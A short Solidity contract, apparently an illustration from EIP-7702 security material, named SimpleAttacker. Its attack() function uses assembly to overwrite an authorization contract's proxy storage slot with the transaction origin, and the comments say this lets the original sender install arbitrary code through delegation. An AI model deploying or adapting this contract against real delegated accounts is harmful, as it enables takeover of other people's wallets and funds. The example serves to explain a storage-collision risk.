// SPDX-License-Identifier: CC0-1.0
pragma solidity ^0.8.20;
contract SimpleAttacker {
    // this slot is equivalent to bytes32(uint256(keccak256("InvariantProxySimple")) - 1).
    bytes32 private constant PROXY_SLOT = 0xf1eebf8b6776af738f9499a7db6badff639300d5eb7a311caa6348385f3f764a;

    // this function updates the PROXY_SLOT of the authorization contract to the original originator's address.
    // the original sender can easily set up an arbitrary code by using EIP-7702 at the address stored at PROXY_SLOT.
    function attack() public payable {
        assembly{
            sstore(PROXY_SLOT, origin())
        }
    }
}
